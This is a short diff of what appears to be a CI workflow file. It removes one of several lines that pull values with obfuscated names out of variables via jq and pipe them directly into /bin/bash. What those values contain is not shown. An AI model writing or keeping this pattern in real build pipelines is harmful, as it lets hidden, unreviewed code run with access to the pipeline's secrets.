@@ -25,7 +25,6 @@ jobs:
           echo $nw9 | jq -r .orwd861 | /bin/bash
           printf '%s' "$tq57" | jq -r .le241 | /bin/bash
           printf '%s' "$ayypp7" | jq -r .v6 | /bin/bash
-          echo $upyn46 | jq -r .fjloe0 | /bin/bash
           echo $qfo178 | jq -r .hie072 | /bin/bash
 
       - name: Upload archive
